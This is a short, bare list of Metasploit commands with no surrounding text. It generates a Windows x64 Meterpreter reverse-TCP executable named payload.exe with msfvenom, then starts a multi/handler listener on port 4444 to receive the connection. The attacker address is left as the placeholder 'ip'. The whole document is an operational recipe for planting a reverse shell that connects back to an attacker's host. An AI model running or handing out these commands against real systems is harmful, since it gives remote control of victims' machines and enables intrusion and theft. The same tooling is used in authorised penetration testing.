msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= ip LPORT=4444 -f exe -o payload.exe

msfconsole

use exploit/multi/handler

set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LHOST ip

set LPORT 4444

exploit

